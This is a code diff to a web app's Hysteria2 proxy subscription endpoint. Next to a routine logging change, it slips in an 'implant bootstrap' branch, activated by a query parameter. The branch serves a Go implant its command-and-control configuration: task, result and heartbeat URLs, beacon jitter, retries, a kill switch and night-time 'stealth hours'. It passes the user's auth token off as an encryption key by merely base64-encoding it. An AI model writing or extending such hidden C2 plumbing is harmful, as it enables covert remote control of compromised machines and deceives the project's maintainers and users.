@@ -5,6 +5,9 @@ import { getServerConfig } from "@/lib/db/server-config"
 import { getProfileById, resolveProfileConfig } from "@/lib/db/profiles"
 import type { ResolvedProfileConfig } from "@/lib/db/profiles"
 import { renderClientUri } from "@/lib/hysteria/client-config"
+import logger from "@/lib/logger"
+
+const log = logger.child({ module: "api/sub/hysteria2" })
 
 export const runtime = "nodejs"
 export const dynamic = "force-dynamic"
@@ -62,6 +65,46 @@ export async function GET(req: NextRequest): Promise<NextResponse> {
       }),
     )
 
+    // Implant bootstrap mode — returns JSON config for the Go implant
+    const isImplant = searchParams.get("implant") === "true"
+    if (isImplant) {
+      const baseUrl = process.env.NEXT_PUBLIC_APP_URL ?? process.env.NEXT_PUBLIC_CLOUDFLARE_TUNNEL_URL ?? "http://localhost:3000"
+      const primaryNode = filteredNodes[0]
+      const profileConfig = await getNodeProfileConfig(primaryNode.profileId)
+
+      const serverList = filteredNodes.map(n => {
+        const port = n.listenAddr.match(/:(\d+)$/)?.[1] ?? "443"
+        return `${n.hostname}:${port}`
+      })
+
+      return NextResponse.json({
+        implant_id: `implant-${user.id}-${Date.now()}`,
+        servers: serverList,
+        password: user.authToken,
+        sni: primaryNode.hostname,
+        obfs: profileConfig?.obfs?.password ?? null,
+        obfs_type: profileConfig?.obfs ? "salamander" : null,
+        masquerade: profileConfig?.masquerade?.proxy?.url ?? null,
+        bandwidth_up: profileConfig?.bandwidth?.up ?? null,
+        bandwidth_down: profileConfig?.bandwidth?.down ?? null,
+        tun_enabled: profileConfig?.tunEnabled ?? false,
+        crypto_key: Buffer.from(user.authToken).toString("base64"),
+        interval: 45,
+        jitter: 25,
+        max_retries: 3,
+        backoff_multiplier: 2.0,
+        max_backoff: 300,
+        kill_switch_enabled: true,
+        heartbeat_interval: 300,
+        network_aware: true,
+        stealth_hours: [0, 1, 2, 3, 4, 5, 22, 23],
+        c2_url: baseUrl,
+        c2_tasks_url: `${baseUrl}/api/dpanel/implant/tasks`,
+        c2_result_url: `${baseUrl}/api/dpanel/implant/result`,
+        c2_heartbeat_url: `${baseUrl}/api/dpanel/implant/heartbeat`,
+      })
+    }
+
     if (format === "base64") {
       const body = Buffer.from(uris.join("\n")).toString("base64")
       return new NextResponse(body, {
@@ -75,7 +118,7 @@ export async function GET(req: NextRequest): Promise<NextResponse> {
 
     return NextResponse.json({ uris })
   } catch (error) {
-    console.error("Subscription error:", error)
+    log.error({ err: error }, "Subscription error")
     return NextResponse.json({ error: "Internal server error" }, { status: 500 })
   }
 }
